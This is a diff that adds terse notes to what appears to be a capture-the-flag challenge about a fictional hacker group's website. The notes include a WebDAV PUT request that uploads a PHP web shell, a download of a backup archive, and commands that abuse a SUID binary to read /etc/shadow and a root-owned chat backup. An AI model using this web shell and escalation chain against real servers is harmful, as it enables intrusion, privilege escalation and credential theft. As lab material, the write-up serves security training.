@@ -7,3 +7,27 @@ You have a mission regarding the hacker group "Melody Hacker Team", whose activi
 Your objective is to gather detailed information about the group's activities and possible new cyber attack plans. You have access to the group's website. We trust you will succeed in this challenging task.
 
 We wish you success!
+
+* webdav vulnerable is running
+
+/webdav found with feroxbuster
+
+*payload to put a web shell bypassing authorization* ->
+#+begin_src python
+PUT /webdav/shell.php HTTP/1.1
+Host: melodyhackerteam.hv
+Content-Length: 28
+
+<?php system($_GET['cmd']); ?>
+#+end_src
+
+*get the zip files* ->
+:  wget http://melodyhackerteam.hv/webdav/web_shell_backup.zip
+
+*finded SUID binary* ->
+ #+begin_src sh
+GET /webdav/shell.php?cmd=/usr/bin/nice /bin/sh -p -c 'cat ../../../etc/shadow'
+ #+end_src
+
+*telegram chat backup at /root* ->
+: ?cmd=/usr/bin/nice /bin/sh -p -c 'cat ../../../root/telegram_chat_backup.txt'
